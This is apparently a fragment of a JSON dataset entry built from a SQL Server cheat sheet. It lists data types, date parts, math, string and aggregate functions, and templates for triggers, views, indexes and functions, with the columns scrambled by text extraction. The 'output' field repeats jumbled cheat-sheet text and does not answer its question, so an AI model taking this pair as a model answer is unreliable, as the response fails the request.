(date)\ndatetime CREATE TRIGGER name\nStrings Dateparts ON\nchar text table\nvarchar Year yy, yyyy FOR\nUnicode Strings Quarter qq, q DELETE, INSERT, UPDATE\nnchar ntext Month mm, m AS\nnvarchar Day of Year dy, y -- Comments\nBinary Strings Day dd, d SELECT * FROM table\nbinary image Week wk, ww GO\nvarbinary Hour hh\nMiscellaneous Minute mi, n Create a View\ncursor table Second ss, s\nsql_variant xml Millisecond ms CREATE VIEW name\nAS\n-- Comments\nType Conversion Mathematical Functions\nSELECT * FROM table\nGO\nCAST (expression AS datatype) ABS LOG10\nCONVERT (datatype, expression) ACOS PI\nASIN POWER Create an Index\nRanking Functions ATAN RADIANS\nCREATE UNIQUE INDEX name"
  },
  {
    "input": "What are the SQL functions listed in the text and what do they do?",
    "summary": "This text outlines various SQL functions and their purposes, including mathematical, string, and aggregate functions. It also demonstrates the creation of a custom function that returns different values based on the input variable. The function uses a CASE statement to determine the output and includes examples of common SQL functions like AVG, MAX, COUNT, and string functions like LEFT, RIGHT, and REVERSE.",
    "output": "ATN2 RAND\nON\n\nRANK NTILE CEILING ROUND\ntable (columns)\nDENSE_RANK ROW_NUMBER COS SIGN\n\nCOT SIN\nCreate a Function\n\nDEGREES SQUARE\nGrouping (Aggregate) Functions\n\nEXP SQRT\nCREATE FUNCTION name\n\nAVG MAX FLOOR TAN\n(@variable datatype(length))\nBINARY_CHECKSUM MIN LOG\n\nRETURNS\n\nCHECKSUM SUM\ndatatype(length)\nCHECKSUM_AVG STDEV String Functions AS\n\nCOUNT STDEVP\n\nBEGIN\nCOUNT_BIG VAR ASCII REPLICATE\nDECLARE @return datatype(length)\n\nGROUPING VARP CHAR REVERSE\nSELECT @return = CASE @variable\n\nCHARINDEX RIGHT\nWHEN 'a' THEN 'return a'\nTable Functions DIFFERENCE RTRIM\nWHEN 'b' THEN 'return b'\n\nLEFT SOUNDEX\nELSE 'return c'\n\nALTER DROP LEN SPACE\nRETURN @return\n\nCREATE TRUNCATE LOWER STR\nEND\n\nLTRIM STUFF\n\nNCHAR SUBSTRING\nAvailable free from PATINDEX UNICODE\nAddedBytes.com REPLACE UPPER\n\nQUOTENAME"
  }
]